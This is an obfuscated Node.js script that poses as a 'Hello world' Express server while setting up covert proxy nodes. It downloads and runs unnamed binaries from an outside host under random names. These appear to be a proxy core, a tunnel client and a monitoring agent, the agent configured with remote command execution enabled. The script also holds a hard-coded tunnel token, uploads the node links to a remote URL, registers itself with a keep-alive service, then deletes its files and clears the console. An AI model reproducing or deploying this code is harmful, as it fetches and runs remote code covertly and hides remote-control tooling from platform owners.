const _0x15aee5=_0x11e1;(function(_0x53b6f3,_0x231623){const _0x1651b6=_0x11e1,_0x21e81b=_0x53b6f3();while(!![]){try{const _0x42c318=-parseInt(_0x1651b6(0xf8))/0x1+parseInt(_0x1651b6(0x109))/0x2+parseInt(_0x1651b6(0x106))/0x3*(parseInt(_0x1651b6(0x176))/0x4)+-parseInt(_0x1651b6(0x107))/0x5+-parseInt(_0x1651b6(0xd2))/0x6+-parseInt(_0x1651b6(0xec))/0x7+parseInt(_0x1651b6(0x110))/0x8*(parseInt(_0x1651b6(0xf3))/0x9);if(_0x42c318===_0x231623)break;else _0x21e81b['push'](_0x21e81b['shift']());}catch(_0x23d6ed){_0x21e81b['push'](_0x21e81b['shift']());}}}(_0x402b,0xb0a9f));const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x15aee5(0x15e)),{promisify}=require('util'),exec=promisify(require('child_process')[_0x15aee5(0x154)]),{execSync}=require(_0x15aee5(0x114)),UPLOAD_URL=process['env'][_0x15aee5(0xd3)]||'',PROJECT_URL=process[_0x15aee5(0x118)][_0x15aee5(0xd9)]||'',AUTO_ACCESS=process[_0x15aee5(0x118)][_0x15aee5(0x177)]||![],FILE_PATH=process[_0x15aee5(0x118)][_0x15aee5(0xdb)]||_0x15aee5(0xe1),SUB_PATH=process['env'][_0x15aee5(0xc7)]||'zuofeng',PORT=process[_0x15aee5(0x118)][_0x15aee5(0x175)]||process['env'][_0x15aee5(0x102)]||0xbb8,UUID=process[_0x15aee5(0x118)][_0x15aee5(0x155)]||_0x15aee5(0x181),NEZHA_SERVER=process[_0x15aee5(0x118)][_0x15aee5(0xe5)]||'',NEZHA_PORT=process[_0x15aee5(0x118)][_0x15aee5(0xcd)]||'',NEZHA_KEY=process[_0x15aee5(0x118)][_0x15aee5(0x13f)]||'',ARGO_DOMAIN=process[_0x15aee5(0x118)][_0x15aee5(0x17b)]||_0x15aee5(0x134),ARGO_AUTH=process[_0x15aee5(0x118)][_0x15aee5(0xda)]||_0x15aee5(0x153),ARGO_PORT=process['env'][_0x15aee5(0x135)]||0x1f41,CFIP=process['env'][_0x15aee5(0x17c)]||_0x15aee5(0xe0),CFPORT=process[_0x15aee5(0x118)][_0x15aee5(0x168)]||0x1bb,NAME=process[_0x15aee5(0x118)]['NAME']||_0x15aee5(0xcf);!fs[_0x15aee5(0x164)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x15aee5(0x156)](FILE_PATH+_0x15aee5(0x121))):console['log'](FILE_PATH+_0x15aee5(0x111));function _0x11e1(_0x596c95,_0x4b0d0d){const _0x402bfd=_0x402b();return _0x11e1=function(_0x11e1f4,_0xaa872e){_0x11e1f4=_0x11e1f4-0xc5;let _0x160c67=_0x402bfd[_0x11e1f4];return _0x160c67;},_0x11e1(_0x596c95,_0x4b0d0d);}function generateRandomName(){const _0x2e24e5=_0x15aee5,_0x27c68e=_0x2e24e5(0xe6);let _0x51f3bf='';for(let _0xca6c9=0x0;_0xca6c9<0x6;_0xca6c9++){_0x51f3bf+=_0x27c68e[_0x2e24e5(0x13a)](Math['floor'](Math[_0x2e24e5(0x170)]()*_0x27c68e[_0x2e24e5(0xe7)]));}return _0x51f3bf;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x15aee5(0x16c)](FILE_PATH,phpName),webPath=path[_0x15aee5(0x16c)](FILE_PATH,webName),botPath=path[_0x15aee5(0x16c)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0x15aee5(0x16c)](FILE_PATH,'list.txt'),bootLogPath=path[_0x15aee5(0x16c)](FILE_PATH,_0x15aee5(0x115)),configPath=path[_0x15aee5(0x16c)](FILE_PATH,'config.json');function deleteNodes(){const _0x21d716=_0x15aee5;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x1b41e5;try{_0x1b41e5=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0x5cf11c=Buffer[_0x21d716(0x148)](_0x1b41e5,_0x21d716(0x11e))[_0x21d716(0x152)]('utf-8'),_0x3e54f1=_0x5cf11c[_0x21d716(0x14c)]('\x0a')['filter'](_0x3247c5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x21d716(0xfe)](_0x3247c5));if(_0x3e54f1[_0x21d716(0xe7)]===0x0)return;return axios[_0x21d716(0x184)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x21d716(0x15a)]({'nodes':_0x3e54f1}),{'headers':{'Content-Type':_0x21d716(0x165)}})[_0x21d716(0x15f)](_0x337993=>{return null;}),null;}catch(_0x5e1aef){return null;}}function _0x402b(){const _0x58de98=['filter','vmess','from','close','arm','\x20>/dev/null\x202>&1\x20&','split','https://arm64.ssss.nyc.mn/web','direct','map','config.json','unshift','toString','eyJhIjoiYjA5ZjcyYmFkYTdmNWU0YWQ3ZmFjZTRjNzdlNzRjNWYiLCJ0IjoiNmMxOWFlODItNTdkNi00ZDU2LWFlMjgtYTI1YmY3YzYzNTYwIiwicyI6IlpXUmxPRFkyWm1NdE9XWXlZUzAwWkRFNExXSTBPR0l0TW1GalptRXlNemc1TnpFNSJ9','exec','UUID','log','\x20-c\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','?security=tls&sni=','stringify','/vless-argo','arch','&fp=firefox&type=ws&host=','path','catch','pkill\x20-f\x20\x22[','\x20is\x20running','\x0a\x20\x20tunnel:\x20','xtls-rprx-vision','existsSync','application/json','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x20-p\x20','CFPORT','&path=%2Ftrojan-argo%3Fed%3D2560#','http','amd','join','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','listen','random','.exe\x20>\x20nul\x202>&1','Error\x20downloading\x20files:','https://amd64.ssss.nyc.mn/agent','vless','SERVER_PORT','72FnpQus','AUTO_ACCESS','includes','&path=%2Fvless-argo%3Fed%3D2560#','tunnel.yml','ARGO_DOMAIN','CFIP','tls','tcp','has','2087','59531c29-ba6a-4251-b055-9e1da4611e3c','\x20>/dev/null\x202>&1','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','post','false','firefox','SUB_PATH','block','arm64','Add\x20automatic\x20access\x20task\x20faild:\x20','nohup\x20','aarch64','NEZHA_PORT','https://amd64.ssss.nyc.mn/v1','railway','clear','?encryption=none&security=tls&sni=','3673008pSrSpP','UPLOAD_URL','https://arm64.ssss.nyc.mn/v1','finish','https://arm64.ssss.nyc.mn/bot','\x20failed:\x20','readFileSync','PROJECT_URL','ARGO_AUTH','FILE_PATH','\x20-s\x20','statSync','Error\x20executing\x20command:\x20','trim','cdns.doon.eu.org','./tmp','2096','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','win32','NEZHA_SERVER','abcdefghijklmnopqrstuvwxyz','length','2083','\x0a\x20\x20credentials-file:\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','127.0.0.1','449596zLGVEZ','Empowerment\x20success\x20for\x20','/sub.txt\x20saved\x20successfully','npm\x20running\x20error:\x20','pipe','php\x20running\x20error:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','7155189ZsiJZK','2053','/dev/null','Error\x20reading\x20boot.log:','App\x20is\x20running','1024704QfezkS','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','chmod','automatic\x20access\x20task\x20added\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Skipping\x20adding\x20automatic\x20access\x20task','test','writeFileSync','ArgoDomain:','NEZHA\x20variable\x20is\x20empty,skip\x20running','PORT','readdirSync','Download\x20','platform','178341GZiNup','741065vjCfoY','quic','1415722RbOQWJ','stream','error','/trojan-argo','/config.json\x20>/dev/null\x202>&1\x20&','set','del\x20/f\x20/q\x20','8yXUeDi','\x20already\x20exists','/api/add-subscriptions','true','child_process','boot.log','response','/tunnel.yml\x20run','env','\x20-c\x20\x22','443','none','forEach','/vmess-argo?ed=2560','base64','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','TunnelSecret','\x20is\x20created','unlinkSync','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','https://amd64.ssss.nyc.mn/bot','config.yaml','mkdirSync','/vmess-argo','text/plain;\x20charset=utf-8','match','8443','https+local://8.8.8.8/dns-query','blackhole','message','basename','trojan','\x0a\x20\x20\x20\x20','rm\x20-rf\x20','createWriteStream','https://arm64.ssss.nyc.mn/agent','railway.740429.xyz','ARGO_PORT','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','taskkill\x20/f\x20/im\x20','unlink','tunnel.json','charAt','\x0a\x20\x20\x0atrojan://','Nodes\x20uploaded\x20successfully','Error\x20in\x20startserver:','isFile','NEZHA_KEY','utf-8','get','freedom','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/api/add-nodes','push'];_0x402b=function(){return _0x58de98;};return _0x402b();}function cleanupOldFiles(){const _0x515cfe=_0x15aee5;try{const _0x5b6bb6=fs[_0x515cfe(0x103)](FILE_PATH);_0x5b6bb6['forEach'](_0x5bc508=>{const _0x3ed642=_0x515cfe,_0x2f3332=path[_0x3ed642(0x16c)](FILE_PATH,_0x5bc508);try{const _0x3cf98f=fs[_0x3ed642(0xdd)](_0x2f3332);_0x3cf98f[_0x3ed642(0x13e)]()&&fs[_0x3ed642(0x122)](_0x2f3332);}catch(_0x44473b){}});}catch(_0x3a546c){}}app['get']('/',function(_0x46d8b5,_0x35b322){_0x35b322['send']('Hello\x20world!');});async function generateConfig(){const _0xe0eee2=_0x15aee5,_0x214a67={'log':{'access':_0xe0eee2(0xf5),'error':_0xe0eee2(0xf5),'loglevel':_0xe0eee2(0x11b)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0xe0eee2(0x163)}],'decryption':_0xe0eee2(0x11b),'fallbacks':[{'dest':0xbb9},{'path':_0xe0eee2(0x15b),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0xe0eee2(0x10c),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0xe0eee2(0x174),'settings':{'clients':[{'id':UUID}],'decryption':_0xe0eee2(0x11b)},'streamSettings':{'network':_0xe0eee2(0x17e),'security':_0xe0eee2(0x11b)}},{'port':0xbba,'listen':_0xe0eee2(0xeb),'protocol':_0xe0eee2(0x174),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0xe0eee2(0x11b)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0xe0eee2(0x16a),_0xe0eee2(0x17d),_0xe0eee2(0x108)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0xe0eee2(0xeb),'protocol':_0xe0eee2(0x147),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0xe0eee2(0x127)}},'sniffing':{'enabled':!![],'destOverride':[_0xe0eee2(0x16a),_0xe0eee2(0x17d),_0xe0eee2(0x108)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0xe0eee2(0xeb),'protocol':_0xe0eee2(0x12f),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0xe0eee2(0x10c)}},'sniffing':{'enabled':!![],'destOverride':[_0xe0eee2(0x16a),_0xe0eee2(0x17d),_0xe0eee2(0x108)],'metadataOnly':![]}}],'dns':{'servers':[_0xe0eee2(0x12b)]},'outbounds':[{'protocol':_0xe0eee2(0x142),'tag':_0xe0eee2(0x14e)},{'protocol':_0xe0eee2(0x12c),'tag':_0xe0eee2(0xc8)}]};fs['writeFileSync'](path['join'](FILE_PATH,_0xe0eee2(0x150)),JSON[_0xe0eee2(0x15a)](_0x214a67,null,0x2));}function getSystemArchitecture(){const _0xb5bf0f=_0x15aee5,_0xc850c3=os[_0xb5bf0f(0x15c)]();return _0xc850c3===_0xb5bf0f(0x14a)||_0xc850c3===_0xb5bf0f(0xc9)||_0xc850c3===_0xb5bf0f(0xcc)?'arm':_0xb5bf0f(0x16b);}function downloadFile(_0x4faf9e,_0xe18c2,_0x4dda26){const _0x125e8b=_0x15aee5,_0x28b8fe=_0x4faf9e;!fs[_0x125e8b(0x164)](FILE_PATH)&&fs[_0x125e8b(0x126)](FILE_PATH,{'recursive':!![]});const _0x2dc056=fs[_0x125e8b(0x132)](_0x28b8fe);axios({'method':_0x125e8b(0x141),'url':_0xe18c2,'responseType':_0x125e8b(0x10a)})['then'](_0x17ad25=>{const _0x32e63b=_0x125e8b;_0x17ad25['data'][_0x32e63b(0xf0)](_0x2dc056),_0x2dc056['on'](_0x32e63b(0xd5),()=>{const _0x3815e7=_0x32e63b;_0x2dc056[_0x3815e7(0x149)](),console['log']('Download\x20'+path[_0x3815e7(0x12e)](_0x28b8fe)+'\x20successfully'),_0x4dda26(null,_0x28b8fe);}),_0x2dc056['on'](_0x32e63b(0x10b),_0x141813=>{const _0x47af03=_0x32e63b;fs[_0x47af03(0x138)](_0x28b8fe,()=>{});const _0x103898=_0x47af03(0x104)+path[_0x47af03(0x12e)](_0x28b8fe)+_0x47af03(0xd7)+_0x141813['message'];console[_0x47af03(0x10b)](_0x103898),_0x4dda26(_0x103898);});})[_0x125e8b(0x15f)](_0x31a18f=>{const _0x2c2ce9=_0x125e8b,_0xc19bc7=_0x2c2ce9(0x104)+path['basename'](_0x28b8fe)+_0x2c2ce9(0xd7)+_0x31a18f[_0x2c2ce9(0x12d)];console['error'](_0xc19bc7),_0x4dda26(_0xc19bc7);});}async function downloadFilesAndRun(){const _0x2d2c60=_0x15aee5,_0xc85786=getSystemArchitecture(),_0x36ca9d=getFilesForArchitecture(_0xc85786);if(_0x36ca9d['length']===0x0){console['log'](_0x2d2c60(0xf9));return;}const _0x4b18fe=_0x36ca9d[_0x2d2c60(0x14f)](_0x31fcd5=>{return new Promise((_0x2c3c88,_0x175b4a)=>{downloadFile(_0x31fcd5['fileName'],_0x31fcd5['fileUrl'],(_0x32ce1f,_0x1b05a8)=>{_0x32ce1f?_0x175b4a(_0x32ce1f):_0x2c3c88(_0x1b05a8);});});});try{await Promise['all'](_0x4b18fe);}catch(_0x22d289){console[_0x2d2c60(0x10b)](_0x2d2c60(0x172),_0x22d289);return;}function _0x3dc0b8(_0x5dcbd8){const _0x46bdc6=_0x2d2c60,_0x23958b=0x1fd;_0x5dcbd8[_0x46bdc6(0x11c)](_0x11c30d=>{const _0x5ad94d=_0x46bdc6;fs[_0x5ad94d(0x164)](_0x11c30d)&&fs[_0x5ad94d(0xfa)](_0x11c30d,_0x23958b,_0xd88397=>{const _0x39c1d8=_0x5ad94d;_0xd88397?console[_0x39c1d8(0x10b)]('Empowerment\x20failed\x20for\x20'+_0x11c30d+':\x20'+_0xd88397):console[_0x39c1d8(0x156)](_0x39c1d8(0xed)+_0x11c30d+':\x20'+_0x23958b[_0x39c1d8(0x152)](0x8));});});}const _0x4d272f=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3dc0b8(_0x4d272f);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x526e7a=NEZHA_SERVER[_0x2d2c60(0x178)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0xeb4868=new Set([_0x2d2c60(0x11a),'8443','2096',_0x2d2c60(0x180),_0x2d2c60(0xe8),_0x2d2c60(0xf4)]),_0x4b19a7=_0xeb4868[_0x2d2c60(0x17f)](_0x526e7a)?_0x2d2c60(0x113):_0x2d2c60(0xc5),_0x5ef3d6='\x0aclient_secret:\x20'+NEZHA_KEY+_0x2d2c60(0x143)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x4b19a7+_0x2d2c60(0x166)+UUID;fs[_0x2d2c60(0xff)](path[_0x2d2c60(0x16c)](FILE_PATH,_0x2d2c60(0x125)),_0x5ef3d6);const _0x56a8a4='nohup\x20'+phpPath+_0x2d2c60(0x119)+FILE_PATH+_0x2d2c60(0xf2);try{await exec(_0x56a8a4),console['log'](phpName+_0x2d2c60(0x161)),await new Promise(_0x422e02=>setTimeout(_0x422e02,0x3e8));}catch(_0x4bed2b){console[_0x2d2c60(0x10b)](_0x2d2c60(0xf1)+_0x4bed2b);}}else{let _0x33cc35='';const _0x69e3ed=['443',_0x2d2c60(0x12a),_0x2d2c60(0xe2),_0x2d2c60(0x180),_0x2d2c60(0xe8),_0x2d2c60(0xf4)];_0x69e3ed[_0x2d2c60(0x178)](NEZHA_PORT)&&(_0x33cc35='--tls');const _0x5805cb=_0x2d2c60(0xcb)+npmPath+_0x2d2c60(0xdc)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2d2c60(0x167)+NEZHA_KEY+'\x20'+_0x33cc35+_0x2d2c60(0x158);try{await exec(_0x5805cb),console[_0x2d2c60(0x156)](npmName+_0x2d2c60(0x161)),await new Promise(_0x1ea3be=>setTimeout(_0x1ea3be,0x3e8));}catch(_0x443b6e){console[_0x2d2c60(0x10b)](_0x2d2c60(0xef)+_0x443b6e);}}}else console[_0x2d2c60(0x156)](_0x2d2c60(0x101));const _0x5ac5dc=_0x2d2c60(0xcb)+webPath+_0x2d2c60(0x157)+FILE_PATH+_0x2d2c60(0x10d);try{await exec(_0x5ac5dc),console[_0x2d2c60(0x156)](webName+_0x2d2c60(0x161)),await new Promise(_0x177d03=>setTimeout(_0x177d03,0x3e8));}catch(_0x512a5d){console[_0x2d2c60(0x10b)]('web\x20running\x20error:\x20'+_0x512a5d);}if(fs['existsSync'](botPath)){let _0x4acf2f;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x4acf2f=_0x2d2c60(0xfc)+ARGO_AUTH;else ARGO_AUTH[_0x2d2c60(0x129)](/TunnelSecret/)?_0x4acf2f=_0x2d2c60(0x123)+FILE_PATH+_0x2d2c60(0x117):_0x4acf2f=_0x2d2c60(0x11f)+FILE_PATH+_0x2d2c60(0xea)+ARGO_PORT;try{await exec(_0x2d2c60(0xcb)+botPath+'\x20'+_0x4acf2f+_0x2d2c60(0x14b)),console[_0x2d2c60(0x156)](botName+'\x20is\x20running'),await new Promise(_0x180e6b=>setTimeout(_0x180e6b,0x7d0));}catch(_0x1cd97f){console[_0x2d2c60(0x10b)](_0x2d2c60(0xde)+_0x1cd97f);}}await new Promise(_0x3fa0e8=>setTimeout(_0x3fa0e8,0x1388));}function getFilesForArchitecture(_0x32b057){const _0x1e2fa7=_0x15aee5;let _0x3e6308;_0x32b057==='arm'?_0x3e6308=[{'fileName':webPath,'fileUrl':_0x1e2fa7(0x14d)},{'fileName':botPath,'fileUrl':_0x1e2fa7(0xd6)}]:_0x3e6308=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x1e2fa7(0x124)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x46ab52=_0x32b057===_0x1e2fa7(0x14a)?_0x1e2fa7(0x133):_0x1e2fa7(0x173);_0x3e6308[_0x1e2fa7(0x151)]({'fileName':npmPath,'fileUrl':_0x46ab52});}else{const _0x28a3a6=_0x32b057==='arm'?_0x1e2fa7(0xd4):_0x1e2fa7(0xce);_0x3e6308['unshift']({'fileName':phpPath,'fileUrl':_0x28a3a6});}}return _0x3e6308;}function argoType(){const _0x46cb8b=_0x15aee5;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x46cb8b(0x156)](_0x46cb8b(0x16e));return;}if(ARGO_AUTH[_0x46cb8b(0x178)](_0x46cb8b(0x120))){fs['writeFileSync'](path[_0x46cb8b(0x16c)](FILE_PATH,_0x46cb8b(0x139)),ARGO_AUTH);const _0x3514c0=_0x46cb8b(0x162)+ARGO_AUTH[_0x46cb8b(0x14c)]('\x22')[0xb]+_0x46cb8b(0xe9)+path[_0x46cb8b(0x16c)](FILE_PATH,'tunnel.json')+_0x46cb8b(0xe3)+ARGO_DOMAIN+_0x46cb8b(0x16d)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x46cb8b(0xff)](path[_0x46cb8b(0x16c)](FILE_PATH,_0x46cb8b(0x17a)),_0x3514c0);}else console[_0x46cb8b(0x156)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x1dbe30=_0x15aee5;let _0xd468bb;if(ARGO_AUTH&&ARGO_DOMAIN)_0xd468bb=ARGO_DOMAIN,console[_0x1dbe30(0x156)]('ARGO_DOMAIN:',_0xd468bb),await _0x5699bc(_0xd468bb);else try{const _0x5abed0=fs[_0x1dbe30(0xd8)](path[_0x1dbe30(0x16c)](FILE_PATH,'boot.log'),_0x1dbe30(0x140)),_0xfc4832=_0x5abed0[_0x1dbe30(0x14c)]('\x0a'),_0x29a45e=[];_0xfc4832[_0x1dbe30(0x11c)](_0x34c0ba=>{const _0x30229d=_0x1dbe30,_0x4a7f2d=_0x34c0ba['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4a7f2d){const _0x2eb98d=_0x4a7f2d[0x1];_0x29a45e[_0x30229d(0x145)](_0x2eb98d);}});if(_0x29a45e[_0x1dbe30(0xe7)]>0x0)_0xd468bb=_0x29a45e[0x0],console[_0x1dbe30(0x156)](_0x1dbe30(0x100),_0xd468bb),await _0x5699bc(_0xd468bb);else{console[_0x1dbe30(0x156)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x1dbe30(0x122)](path[_0x1dbe30(0x16c)](FILE_PATH,_0x1dbe30(0x115)));async function _0x5acab0(){const _0x465644=_0x1dbe30;try{process[_0x465644(0x105)]===_0x465644(0xe4)?await exec(_0x465644(0x137)+botName+_0x465644(0x171)):await exec(_0x465644(0x160)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x471dcf){}}_0x5acab0(),await new Promise(_0x522d09=>setTimeout(_0x522d09,0xbb8));const _0x22cc39='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x1dbe30(0xea)+ARGO_PORT;try{await exec(_0x1dbe30(0xcb)+botPath+'\x20'+_0x22cc39+_0x1dbe30(0x14b)),console[_0x1dbe30(0x156)](botName+'\x20is\x20running'),await new Promise(_0x95a36d=>setTimeout(_0x95a36d,0xbb8)),await extractDomains();}catch(_0x1daefa){console[_0x1dbe30(0x10b)](_0x1dbe30(0xde)+_0x1daefa);}}}catch(_0x33d39e){console[_0x1dbe30(0x10b)](_0x1dbe30(0xf6),_0x33d39e);}async function _0x5699bc(_0x42eee2){const _0x1544b1=_0x1dbe30,_0x3dc819=execSync(_0x1544b1(0x183),{'encoding':_0x1544b1(0x140)}),_0x1f6e49=_0x3dc819[_0x1544b1(0xdf)](),_0x3e9a5b=NAME?NAME+'-'+_0x1f6e49:_0x1f6e49;return new Promise(_0x32898e=>{setTimeout(()=>{const _0x4edfac=_0x11e1,_0x24364c={'v':'2','ps':''+_0x3e9a5b,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4edfac(0x11b),'net':'ws','type':'none','host':_0x42eee2,'path':_0x4edfac(0x11d),'tls':_0x4edfac(0x17d),'sni':_0x42eee2,'alpn':'','fp':_0x4edfac(0xc6)},_0x41bf82='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x4edfac(0xd1)+_0x42eee2+_0x4edfac(0x15d)+_0x42eee2+_0x4edfac(0x179)+_0x3e9a5b+'\x0a\x20\x20\x0avmess://'+Buffer[_0x4edfac(0x148)](JSON[_0x4edfac(0x15a)](_0x24364c))[_0x4edfac(0x152)](_0x4edfac(0x11e))+_0x4edfac(0x13b)+UUID+'@'+CFIP+':'+CFPORT+_0x4edfac(0x159)+_0x42eee2+_0x4edfac(0x15d)+_0x42eee2+_0x4edfac(0x169)+_0x3e9a5b+_0x4edfac(0x130);console[_0x4edfac(0x156)](Buffer[_0x4edfac(0x148)](_0x41bf82)[_0x4edfac(0x152)](_0x4edfac(0x11e))),fs[_0x4edfac(0xff)](subPath,Buffer[_0x4edfac(0x148)](_0x41bf82)[_0x4edfac(0x152)](_0x4edfac(0x11e))),console['log'](FILE_PATH+_0x4edfac(0xee)),uploadNodes(),app[_0x4edfac(0x141)]('/'+SUB_PATH,(_0x374d40,_0x432864)=>{const _0x48b7da=_0x4edfac,_0x141799=Buffer[_0x48b7da(0x148)](_0x41bf82)[_0x48b7da(0x152)]('base64');_0x432864[_0x48b7da(0x10e)]('Content-Type',_0x48b7da(0x128)),_0x432864['send'](_0x141799);}),_0x32898e(_0x41bf82);},0x7d0);});}}async function uploadNodes(){const _0x42c990=_0x15aee5;if(UPLOAD_URL&&PROJECT_URL){const _0x5091b0=PROJECT_URL+'/'+SUB_PATH,_0x5cfc2b={'subscription':[_0x5091b0]};try{const _0x1f413d=await axios[_0x42c990(0x184)](UPLOAD_URL+_0x42c990(0x112),_0x5cfc2b,{'headers':{'Content-Type':_0x42c990(0x165)}});return _0x1f413d&&_0x1f413d['status']===0xc8?(console['log']('Subscription\x20uploaded\x20successfully'),_0x1f413d):null;}catch(_0x4fc4eb){if(_0x4fc4eb[_0x42c990(0x116)]){if(_0x4fc4eb['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x42c990(0x164)](listPath))return;const _0x9cf486=fs['readFileSync'](listPath,_0x42c990(0x140)),_0x11fb3f=_0x9cf486[_0x42c990(0x14c)]('\x0a')[_0x42c990(0x146)](_0xb16462=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x42c990(0xfe)](_0xb16462));if(_0x11fb3f[_0x42c990(0xe7)]===0x0)return;const _0x26bec0=JSON['stringify']({'nodes':_0x11fb3f});try{const _0x30dae4=await axios['post'](UPLOAD_URL+_0x42c990(0x144),_0x26bec0,{'headers':{'Content-Type':_0x42c990(0x165)}});return _0x30dae4&&_0x30dae4['status']===0xc8?(console[_0x42c990(0x156)](_0x42c990(0x13c)),_0x30dae4):null;}catch(_0x3fc3ee){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x1add9c=_0x11e1,_0x2c54fa=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2c54fa['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2c54fa['push'](phpPath);process[_0x1add9c(0x105)]===_0x1add9c(0xe4)?exec(_0x1add9c(0x10f)+_0x2c54fa[_0x1add9c(0x16c)]('\x20')+'\x20>\x20nul\x202>&1',_0x52f97f=>{const _0x6ba6dd=_0x1add9c;console['clear'](),console[_0x6ba6dd(0x156)](_0x6ba6dd(0xf7)),console['log'](_0x6ba6dd(0x136));}):exec(_0x1add9c(0x131)+_0x2c54fa['join']('\x20')+_0x1add9c(0x182),_0x55ee01=>{const _0x35826e=_0x1add9c;console[_0x35826e(0xd0)](),console['log'](_0x35826e(0xf7)),console[_0x35826e(0x156)](_0x35826e(0x136));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x34a006=_0x15aee5;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x34a006(0x156)](_0x34a006(0xfd));return;}try{const _0x4130e0=await axios[_0x34a006(0x184)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x34a006(0x165)}});return console[_0x34a006(0x156)](_0x34a006(0xfb)),_0x4130e0;}catch(_0x42174c){return console[_0x34a006(0x10b)](_0x34a006(0xca)+_0x42174c[_0x34a006(0x12d)]),null;}}async function startserver(){const _0x5cb84d=_0x15aee5;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x25268f){console[_0x5cb84d(0x10b)](_0x5cb84d(0x13d),_0x25268f);}}startserver()[_0x15aee5(0x15f)](_0x5682b4=>{const _0x411cee=_0x15aee5;console[_0x411cee(0x10b)]('Unhandled\x20error\x20in\x20startserver:',_0x5682b4);}),app[_0x15aee5(0x16f)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
